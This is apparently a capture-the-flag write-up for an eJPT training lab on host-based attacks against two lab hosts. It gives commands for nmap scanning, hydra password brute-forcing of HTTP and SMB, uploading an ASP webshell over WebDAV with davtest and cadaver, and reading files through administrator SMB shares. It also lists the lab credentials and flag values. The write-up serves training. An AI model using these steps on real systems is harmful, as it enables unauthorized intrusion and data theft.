# Host-Network-Penetration-Testing-System-Host-Based-Attacks-CTF-1-EJPT

#### Host & Network Penetration Testing: System-Host Based Attacks CTF 1

Targets
**http://target1.ine.local** and **http://target2.ine.local**.

IP's
target1 - 10.5.17.190
target2  -  10.5.26.51

```
nmap -sV -sC -p- target1.ine.local
```
![[Pasted image 20251120101204.png]]
![[Pasted image 20251120101244.png]]

We have discovered that multiple ports are open. In port 80 we have microsoft IIS httpd 10.0 server. It has a authentication.

Let's have a look at web
![[Pasted image 20251120101843.png]]

Let's perform a brute force attack using hydra
NOTE : We have a hint that the user name is **bob**
```
hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt http-get target1.ine.local /
```
![[Pasted image 20251120102341.png]]
we got the password for bob

>> bob:password_123321

Let's login 
![[Pasted image 20251120102533.png]]

There is no much information 
let's try to find other directories
```
dirb http://target1.ine.local/ -u bob:password_123321
```
![[Pasted image 20251120103017.png]]
let's have a look at each page

In /webdav/ directory we have our first flag (i.e flag1.txt)

![[Pasted image 20251120103232.png]]

`d2eddc407e1e4b049a4023d3e16b1bc0`  this is our flag

Let's dig more through webdav/ 

Let's see what files can we upload 
```
davtest -auth bob:password_123321 -url http://target1.ine.local/webdav/ 
```
![[Pasted image 20251120103908.png]]
![[Pasted image 20251120103952.png]]
From web we can see the uploaded file directory
![[Pasted image 20251120104123.png]]

Let's have a try with `cadaver` command

```
cadaver http://target1.ine.local/webdav/
```
![[Pasted image 20251120104512.png]]

we tried to login with bob user. we got in 
we tried to upload `webshell.asp` file
NOTE : give location /usr/share/webshells/asp/webshell.asp

Let's access that file in web

![[Pasted image 20251120104752.png]]

we have a shell

run the command 
```
cd C:// && dir
```


```
cd C:// && type flag2.txt
```

this reveals our flag
![[Pasted image 20251120105031.png]]
`edf1d78ca4de4873883f8b50e518bc55`  this is our flag.




Now, lets move to other target (target2.ine.local)

perform a nmap scan
```
nmap -sV -sC -p- target2.ine.local
```

![[Pasted image 20251120105437.png]]
![[Pasted image 20251120105512.png]]

We see so many open ports lets have a look at port 445 SMB
we see a windows server 2019 running at port 445

lets try to connect to smb
```
smbclient -L target2.ine.local
```
It has a authentication 
Lets see enum4linux
```
enum4linux target2.ine.local -SU
```
we didn't got anything

lets try brute force using the given files with hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://target2.ine.local 
```

![[Pasted image 20251120111029.png]]

we have some logins 
let's check user shares with  smbclient  for user administrator
```
smbclient -L \\\\target2.ine.local\\ -U administrator
```

![[Pasted image 20251120111741.png]]

lets go to `C$` shares
```
smbclient \\\\target2.ine.local\\C$ -U administrator
```
![[Pasted image 20251120111956.png]]

we have a file called flag3.txt , this reveal our third flag
we have to download flag3.txt by
```
get flag3.txt 
```
`91bd8ee6611d4134a419def66f646fdb`  this is our flag


Now for flag4 , go to Users > administrator > Desktop
you can see flag4.txt file 
Download it , It will reveals our flag

`c364ecdc791040d2ad796635bbc925ca`  this is our flag.

